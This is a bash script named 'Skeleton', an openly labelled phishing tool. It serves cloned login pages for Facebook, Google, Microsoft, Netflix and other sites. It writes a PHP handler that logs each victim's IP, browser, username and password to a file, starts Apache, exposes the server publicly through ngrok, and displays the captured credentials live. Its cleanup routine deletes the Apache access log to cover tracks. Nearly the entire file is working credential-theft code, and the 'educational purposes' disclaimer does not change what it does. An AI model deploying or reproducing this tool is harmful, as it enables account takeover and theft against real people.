#!/bin/bash

#  _______ __          __       __                  
# |   _   |  |--.-----|  .-----|  |_.-----.-----.   
# |   1___|    <|  -__|  |  -__|   _|  _  |     |   
# |____   |__|__|_____|__|_____|____|_____|__|__|   
# |:  1   |                                         
# |_______|

#**** INFO ****
#
# Skeleton is a Social Engineering tool attack switcher
# Type: Phishing Tool
#
# Target: Facebook, Linkedin, Twitter, Pinterest, Google, Instagram, Microsoft, Netflix
#
# DISCLAMER: Program for educational purposes!!!
# 
#**********************
#
# Name: Skeleton
# Version: 1.0 beta
# Dev: Shell
# Language: En        
# Date: 08/14/2017   
# Author: KURO-CODE   
#
#**********************
#**********************
#
# Name: Skeleton
# Version: 1.1
# Dev: Shell
# Language: En        
# Date: 03/28/2018   
# Author: KURO-CODE   
#
# -Attack Switcher BugFix
# -Exit (Revision)
# -BugFix
# -Check ROOT perm...
# 
#**********************
#**********************
#
# Name: Skeleton
# Version: 1.2
# Dev: Shell
# Language: En        
# Date: 10/28/2018   
# Author: KURO-CODE   
#
# + BugFix
#
# ~~~ Sites ~~~
#
# + Google
# + Instagram
# + Microsoft
# + Netflix
# 
#**********************

#**** Skeleton version ****
VERSION="1.2"

#**** Screen size ****
resize -s 20 61 > /dev/null

#**** Check Root ****
function check_root_perm() {
	clear
	FLAG
	user=$(whoami)
	if [ "$user" = "root" ]; then
  		echo -e "
$W [$G""X$W]$GR...$G""Y$W""ou are $G""Root$W!"
  		sleep 1.2
  		RUN
	else
		echo -e "
$W [$R""X$W]$GR...$R""Y$W""ou are not $R""Root$W!
 
 $G""U$W""se:$Y sudo ./skeleton.sh$EC"
 		sleep 1
    	echo -e "
$W [$R""X$W]$GR...$R""C$W""lose" 
    	sleep 1
	fi
}

#**** CONFIG ****
IMG_PATH="img"
TMP="/var/www/html"
SITE="site/$site/$lang/index.html"
SYSTM32="ngrok"
SYSTEM64="ngrok_64"
SKELEDIAL="  SkEleToN~OpTioN: "

#**** Color ****
CL="\033[0;7m"
W="\033[1;37m"
GR="\033[0;37m"
R="\033[1;31m"
G="\033[1;32m"
Y="\033[1;33m"
B="\033[1;34m"
M="\033[1;35m"
EC="\033[0m"

#**** Display ****
DISPLAY_LOG="-geometry 40x5+800+0"
DISPLAY_SERV="-geometry 80x10+600-300"
DISPLAY_KEY="-geometry 100x21+600-0"

#**** TOP MENU SELECT ****
MENU_main="$W~ Main Menu ~$EC"
MENU_info="$W~ I N F O ~"
MENU_skel="$W~ Skeleton menu ~"
MENU_skel1="$B""S$W""E$GR""le$W""CT"
MENU_skel2="Select an attack"

#~~~ START ~~~
function RUN {
	Place="Run"
	clear
	FLAG
	sleep 1
	echo -e "\n	  $B ***********************************
           *$B   A$W automatic$M phishing$R server$B   *
           *$W By$B K$W""U$B""R$W""O-$B""C$W""O$B""D$B""E$G &$M Z$W""0$W""m$M""B$W""13$M""D$W""o$M""LL$G 2$W""0$R""17$B  *
	   ***********************************$EC
"
	sleep 3
main
}

function main {
	Place="MAIN"
	clear
	FLAG
	echo
	echo -e "\n	    $MENU_main
         $B""o$W-----------------$B""o$W
         |  1$W)$GR...$B""I$GR""n$W""f$GR""o$W      |
         |  2$W)$GR...$B""S$W""k$GR""e$W""le$GR""to$W""n  |
         |$R  0$W)$GR...$R""Exit$W      |
         $B""o$W-----------------$B""o$EC
"
	read -p "$SKELEDIAL" opt
		case $opt in
			1) inf;;
			2) select_attack;;
			0) EXITMODE;;
			*) echo -e "$CL$R[ERROR]$EC"; sleep 2; main;;
		esac
}

#~~~~ Attack Selection ~~~~
function select_attack {
	place="Sel_Attack"
	clear
	FLAG
	echo
	echo -e "                ~ $W$MENU_skel2 ~
         $B""o$W--------------------------------$B""o$W
         | $W""1)$GR...$B""F$W""acebook   2)$GR...$B""L$W""inkedin  |
	 |                                |
	 | $W""3)$GR...$B""T$W""witter    4)$GR...$B""P$W""interest |
	 |                                |
	 | $W""5)$GR...$B""G$W""oogle     6)$GR...$B""I$W""nstagram |
	 |                                |
	 | $W""7)$GR...$B""M$W""icrosoft  8)$GR...$B""N$W""etflix   |
         |                                |
         |   $R""0$W)$GR...$R""Exit       $Y""9$W)$GR...$Y""Back$W    |
         $B""o$W--------------------------------$B""o$EC      
"	 
	read -p "$SKELEDIAL" site
		case $site in
			1)
				site="facebook"
	    			if [ ! -d "sites/facebook" ]; then
	        			echo -e " $W[$Y!$W]$GR...$R""N$W""ot Exist$EC"
	        			sleep 2
	        			select_attack
	    			else
						lang 
	    			fi ;;

			2)
				site="linkedin"
	    			if [ ! -d "sites/linkedin" ]; then
	        			echo -e " $W[$Y!$W]$GR...$R""N$W""ot Exist$EC"
	        			sleep 2
	        			select_attack
	    			else
						lang 
	    			fi ;;

			3)
				site="twitter"
	    			if [ ! -d "sites/twitter" ]; then
	        			echo -e " $W[$Y!$W]$GR...$R""N$W""ot Exist$EC"
	        			sleep 2
	        			select_attack
	    			else
						lang 
	    			fi ;;

			4)
				site="pinterest"
	    			if [ ! -d "sites/pinterest" ]; then
	        			echo -e " $W[$Y!$W]$GR...$R""N$W""ot Exist$EC"
	        			sleep 2
	        			select_attack
	    			else
						lang 
	    			fi ;;

	    	5)
				site="google"
	    			if [ ! -d "sites/google" ]; then
	        			echo -e " $W[$Y!$W]$GR...$R""N$W""ot Exist$EC"
	        			sleep 2
	        			select_attack
	    			else
						lang 
	    			fi ;;

	    	6)
				site="instagram"
	    			if [ ! -d "sites/instagram" ]; then
	        			echo -e " $W[$Y!$W]$GR...$R""N$W""ot Exist$EC"
	        			sleep 2
	        			select_attack
	    			else
						lang 
	    			fi ;;
	    	7)
				site="microsoft"
	    			if [ ! -d "sites/microsoft" ]; then
	        			echo -e " $W[$Y!$W]$GR...$R""N$W""ot Exist$EC"
	        			sleep 2
	        			select_attack
	    			else
						lang 
	    			fi ;;
	    	8)
				site="netflix"
	    			if [ ! -d "sites/netflix" ]; then
	        			echo -e " $W[$Y!$W]$GR...$R""N$W""ot Exist$EC"
	        			sleep 2
	        			select_attack
	    			else
						lang 
	    			fi ;;
			9) echo -e " [*]...Back" ; main ;;
			0) EXITMODE ;;
			*) echo -e "$CL$R[ERROR]$EC"; sleep 3; select_attack ;;
		esac
}

#~~~~ Attack Language ~~~~
function lang {
		Place="Lang"
	        clear
	        FLAG
                echo -e "\n       ~ Select language attack ~ 
      
           $B""o$W-----------------$B""o$W
           |  1$W)$GR...$G""English$W   |
           |  2$W)$GR...$G""French$W    |
           |$R  9$W)$GR...$R""Back$W      | 
           $B""o$W-----------------$B""o$EC
"
	        read -p "$SKELEDIAL" opt_lang	
				case $opt_lang in
					1)
						SLang="en"
	    				if [ ! -d "sites/$site/$SLang" ]; then
	        	  			echo -e " $W[$Y!$W]$GR...$R""N$W""ot Exist$EC"
							echo -e "$site"
	        	  			sleep 2
	        	  			select_attack
	    		  		else
							clear
	                  		FLAG
	                  		echo -e "\n $W[$G*$W]$GR...$G$site$W"
	                  		sleep 0.5
	                  		echo -e " $W[$B""E$W""n]$GR...$B""E$W""nglish selected"
	                  		sleep 0.5
	                  		echo -e " [$G*$W]$GR...$Y""Copy files$EC"
							CopyFiles
                        	Script
	                  		sleep 3
	                  		set_serv
	    		  		fi ;;

					2)
						SLang="fr"
	    		  		if [ ! -d "sites/$site/$SLang" ]; then
	        	  			echo -e " $W[$Y!$W]$GR...$R""N$W""ot Exist$EC"
			        		echo -e "$site"
	        	  			sleep 2
	        	  			select_attack
	    		  		else
							clear
	                  		FLAG
	                  		echo -e "\n $W[$G*$W]$GR...$G$site$W"
	                  		sleep 0.5
	                  		echo -e " $W[$B""F$W""R]$GR...$B""F$W""rench selected"
	                  		sleep 0.5
	                  		echo -e " [$G*$W]$GR...$Y""Copy files$EC"
							CopyFiles
                          	Script
	                  		sleep 3
	                  		set_serv
	    		  		fi ;;
	
	            	9) echo -e "$W[$R*$W]$GR...$W""Back" ; sleep 2 ; main ;; 		 
					*) echo -e "$CL$R[ERROR]$EC"; sleep 3; lang ;; 			
				esac
}

#~~~~ Script ~~~~
function Script() {
	echo "<?php

if (!empty(\$_SERVER['HTTP_CLIENT_IP']))
    {
      \$ipaddress = \$_SERVER['HTTP_CLIENT_IP'].\"\\r\\n\";
    }
elseif (!empty(\$_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      \$ipaddress = \$_SERVER['HTTP_X_FORWARDED_FOR'].\"\\r\\n\";
    }
else
    {
      \$ipaddress = \$_SERVER['REMOTE_ADDR'].\"\\r\\n\";
    }
\$useragent = \"User-Agent: \";
\$Username = \"Username: \";
\$PassWord = \"Password: \";
\$browser = \$_SERVER['HTTP_USER_AGENT'].\"\\r\\n\";
\$user = \$_POST['username'].\"\\r\\n\";
\$pass = \$_POST['password'].\"\\r\\n\";
\$CUT = \"-------------------------------\";

\$file = 'id.txt';
\$victim = \"\r\nIP: \";
\$fp = fopen(\$file, 'a');

fwrite(\$fp, \$victim);
fwrite(\$fp, \$ipaddress);
fwrite(\$fp, \$useragent);
fwrite(\$fp, \$browser);
fwrite(\$fp, \$Username);
fwrite(\$fp, \$user);
fwrite(\$fp, \$PassWord);
fwrite(\$fp, \$pass);
fwrite(\$fp, \$CUT);

fclose(\$fp);

header('Location: https://$site.com/');
exit();
" > $TMP/login.php

	echo "<?php
include 'id.php';
header('Location: index.html');
exit
?> " > $TMP/index.php

}

#~~~~ Copy Files ~~~~
function CopyFiles() {
	cp -r sites/$site/$SLang/* $TMP/
}

#~~~~ Set Server ~~~~
function set_serv {
	Place="Set_Serv"
	echo "#!/bin/bash

function rep {
clear
echo -e \"
   $W~ Key ~$EC 
\"
sleep 1

for i in \"$TMP/id.txt\"

do
echo -e \"****************
 $site
****************\"

cat $TMP/id.txt 

done

sleep 3
rep
}
rep" > key.sh

	chmod +x key.sh
	chmod 777 /var/www/html
	service apache2 start
	sleep 1
	clear
	FLAG
	echo -e " 
	$W~ S$GR""e$W""T sE$GR""r$W""Ve$GR""r$W ~
	$B""o$W------------$B""o$W
	|$B 1$W)$GR...$B""3$W""2B$GR""it$W |
	|$M 2$W)$GR...$M""6$W""4b$GR""i$W""T |
	|$Y 3$W)$GR...$G""N$W""E$GR""x$W""T  |
	$B""o$W------------$B""o$W

[$Y""i$W] Server is active? Yes do \"next\" or select your system [$Y""i$W]
"
	read -p "$SKELEDIAL" setserv

	xterm -title "Skeleton Control" $DISPLAY_LOG -bg "#000000" -fg "#11ff00" -e "tail -f $TMP/id.txt > sk_tmp.csv" &
    xterm -title "Skeleton" $DISPLAY_KEY -e "./key.sh" &
	
	if [ "$setserv" -eq "1" ]; then
	  Sys="$SYSTM32"
      echo -e "$W[$R+$W] Start service 32bit..."
	  sleep 2
	  chmod +x $SYSTM32
	  xterm -title "Skeleton Server Log" $DISPLAY_SERV -e ./$SYSTM32 http 80 &
	  sleep 2
      control

	elif [ "$setserv" -eq "2" ]; then
		Sys="$SYSTEM64"
        echo -e "$W[$R+$W] Start service 64bit..."
	    sleep 2
	    chmod +x $SYSTEM64
	    xterm -title "Skeleton Server Log" $DISPLAY_SERV -e ./$SYSTEM64 http 80 &
	    sleep 2
	    control
	    xterm -title "Skeleton Key" $DISPLAY_KEY -e "./key.sh" &
        set_serv

	elif [ "$setserv" -eq "3" ]; then
		control

	else
	    echo -e "$CL$R[ERROR]$EC" 
	    sleep 2 
	    set_serv 
	fi	
}

#~~~~ Control Menu ~~~~
function control {
	Place="Control"
	clear
	FLAG
	echo -e "\n        ~ Control attack switcher~
      $B""o$W----------------------------$B""o$W
      |$B 1$W)$GR...$W""Stop attack           |
      |$B 2$W)$GR...$W""Select another attack |
      |$B 3$W)$GR...$W""Back to main menu     |
      |$R 0$W)$GR...$R""Exit$W                  |
      $B""o$W----------------------------$B""o$EC
"
	read -p "$SKELEDIAL" opt
 
		case $opt in
			1) report; Kill_Process; Kill_Services; Clean_TMP; main;;
			2) report; Kill_Another; Clean_TMP; Kill_Services; select_attack;;
			3) report; Kill_Process; Kill_Services; Clean_TMP; main;;
			0) Kill_Process; Clean_TMP; Kill_Services; EXITMODE;;
			*) echo -e "$CL$R[ERROR]$EC"; sleep 2; control;;
		esac
}

#~~~~ INFO ~~~~
function inf {
	Place="Info_Menu"
	clear
	FLAG
	echo
	echo -e " 	         $MENU_info
	  $B""o$W------------------------$B+
	  $W|$CL$G Name:....Skeleton      $EC$W|
	  $W|$CL$G Dev:.....Shell         $EC$W|
	  $W|$CL$G Ver:.....$VERSION           $EC$W|
	  $W|$CL$G Date:....10/28/2018    $EC$W|
	  $W|$CL$G Coder:...Kuro-code     $EC$W|
	  $W|$CL$G Info:....Phishing tool $EC$W|
	  $B""o$W------------------------$B""o$W

      [$M!$W] Special thanks: Z0mB13Do77 [$M!$W]

     [$Y¡$W] Press$Y Enter$W, return main menu [$Y¡$W]$EC 	"
	read pause
main
}

#~~~~ Report ~~~~
function report {
	Place"report"
	clear
	FLAG
	echo -e "
$W[$R*$W]$GR...$W""Stop attack$GR...$W[$R*$W]"
	RPRT=`cat $TMP/id.txt` 
	Date=`date +%D`
	echo -e "\n   ~ $site Phishing Session ~
****************************************
$Date
$RPRT

===============================
         SkEleToN 1.2
===============================
  " > $site.txt
}

#~~~~ Exit ~~~~
function EXITMODE {
	clear
	FLAG
	echo
	echo -e "\n	$CL Thanks for use Skeleton $EC"
	sleep 2.5
	clear
	exit
}

#~~~~ Function Kill ~~~~
function Kill_Services() {
	echo -e "\n$W[$R+$W]$GR Close services."
	sleep 0.1
	echo -e "\n$W[$R+$W]$GR Shutdow Apache."
	service apache2 stop
	chmod 700 /var/www/html
	sleep 1
}

function Kill_Another() {
	echo -e "\n$W[$R+$W]$GR Kill process... "
	pkill key.sh
	sleep 0.2
	pkill tail
	sleep 1	
}

function Kill_Process() {
	echo -e "\n$W[$R+$W]$GR Kill process... "
	pkill key.sh
	sleep 0.2
	pkill $Sys
	sleep 0.2
	pkill tail
	sleep 1
}

#~~~~ CLEAN TMP ~~~~
function Clean_TMP() {
	echo -e "\n$W[$G+$W]$GR Clean temporary files"
	rm -rf $TMP/*
	sleep 0.2
	rm -f /var/log/apache2/access.log
	sleep 0.2
	rm -f key.sh
	sleep 0.2
	rm -f *.csv
	sleep 0.2
}

#~~~~ FLAG ~~~~
function FLAG {
	echo -e "$B  _______$W __          __       __                  
 $B|   _   |$W  |--.-----|  .-----|  |_.-----.-----.   
 $B|   1___|$W    <|  -__|  |  -__|   _|  _  |     |   
 $B|____   |$W""__|__|_____|__|_____|____|_____|__|__|   
 $B|:  1   |                                         
 $B|_______|     $W""Social engineering tool$GE v$VERSION$EC "
}

#~~~~ Hard Exit ~~~~
function cap_traps() {
	case $Place in
		"Run") clear; EXITMODE;;
		"MAIN") clear; EXITMODE;;
		"Sel_Attack") clear; FLAG; Clean_TMP; EXITMODE;;
		"Info_Menu") clear; EXITMODE;;
		"Lang") clear; FLAG; Clean_TMP; EXITMODE;;
		"Set_Serv") clear; FLAG; Clean_TMP; EXITMODE;;
		"Control") clear; FLAG; Kill_Process; Kill_Services; Clean_TMP; EXITMODE;;
	esac 
}

for x in SIGINT SIGHUP INT SIGTSTP; do
	trap_cmd="trap \"cap_traps $x\" \"$x\""
	eval "$trap_cmd"
done

#### START ####
check_root_perm
